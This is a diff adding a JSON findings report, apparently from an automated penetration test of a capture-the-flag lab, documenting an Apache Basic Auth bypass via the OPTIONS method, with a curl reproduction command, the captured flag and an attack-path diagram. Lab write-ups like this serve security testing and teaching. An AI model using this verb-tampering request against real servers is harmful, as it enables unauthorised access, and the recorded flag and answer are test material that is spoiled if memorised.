@@ -1,0 +1,32 @@
+{
+  "meta": {
+    "created": "2026-04-13T11:31:37.380457+00:00",
+    "target": ""
+  },
+  "findings": [
+    {
+      "id": "4ef5dde1-c83a-41e6-917c-4567115000a7",
+      "timestamp": "2026-04-13T11:31:37.380358+00:00",
+      "title": "HTTP Basic Auth Bypass via OPTIONS Method \u2014 CTF Flag Extracted",
+      "severity": "critical",
+      "target": "http://172.17.0.1:49387/index.php",
+      "description": "The Apache 2.4.25 server protects the entire site with HTTP Basic Authentication. However, the auth directive only applies to specific HTTP methods (GET, POST, HEAD) via a <Limit> block in .htaccess or VirtualHost config. The OPTIONS method is not included in the <Limit> restriction, allowing an unauthenticated attacker to send OPTIONS /index.php and receive the full PHP response \u2014 including the CTF flag \u2014 without any credentials.\n\nThis is a variant of the HTTP verb tampering / method bypass class of vulnerability (OWASP A01). Apache's <Limit> directive restricts auth to listed methods only; unlisted methods (like OPTIONS) bypass the restriction entirely.",
+      "evidence": "curl -s -X OPTIONS http://172.17.0.1:49387/index.php\n\nResponse: HTTP/1.1 200 OK\nX-Powered-By: PHP/5.6.40\n\n<h3>Congratulations, here is the flag: flag{54b33cfd-e3fc-453e-b367-513dd814da3d}</h3>\n\nFLAG: flag{54b33cfd-e3fc-453e-b367-513dd814da3d}",
+      "tool_used": "curl",
+      "cve": "",
+      "reproduction": {
+        "type": "http",
+        "command": "curl -s -X OPTIONS http://172.17.0.1:49387/index.php",
+        "expected": "200 OK with flag{54b33cfd-e3fc-453e-b367-513dd814da3d} in response body"
+      }
+    }
+  ],
+  "diagrams": [
+    {
+      "id": "0137cdd8-2282-4b24-89c6-7dc1e2b6b999",
+      "timestamp": "2026-04-13T11:31:53.871811+00:00",
+      "title": "Attack Path - HTTP Verb Bypass CTF",
+      "mermaid": "flowchart TD\n  Attacker[\"Attacker (172.17.0.2)\"] -->|\"GET / HTTP/1.1\"| Apache[\"Apache 2.4.25 (172.17.0.1:49387)\"]\n  Apache -->|\"401 Unauthorized - Basic realm\"| Attacker\n  Attacker -->|\"OPTIONS /index.php HTTP/1.1\"| Apache\n  Apache -->|\"200 OK - PHP/5.6.40 - NO AUTH REQUIRED\"| Attacker\n  Attacker -->|\"flag{54b33cfd-e3fc-453e-b367-513dd814da3d}\"| Flag[\"FLAG EXTRACTED\"]\n  Apache -->|\"port-forward 49387 to 80\"| Container[\"Container 172.18.0.2:80\"]\n  Container --> PHP[\"PHP 5.6.40 index.php\"]\n  PHP --> DB[\"Login Form + Flag\"]\n  note1[\"Root cause: Apache Limit block\\nonly restricts GET POST HEAD\\nOPTIONS bypasses auth entirely\"]"
+    }
+  ]
+}
